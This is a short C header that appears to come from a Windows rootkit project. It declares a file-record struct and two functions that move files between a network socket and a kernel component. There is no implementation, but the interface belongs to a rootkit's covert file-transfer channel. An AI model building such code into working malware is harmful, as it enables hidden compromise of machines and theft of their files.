#pragma once

typedef struct _ROOTKIT_STORE_USERSPACE_FILE
{
	CHAR FileName[255];
	ULONG FileSize;

}ROOTKIT_STORE_USERSPACE_FILE, *PROOTKIT_STORE_USERSPACE_FILE;

BOOLEAN rootkit_get_file_from_kernel(IN SOCKET socket, IN BYTE PacketType);
BOOLEAN rootkit_send_file_to_kernel(IN SOCKET sock, IN BYTE PacketType);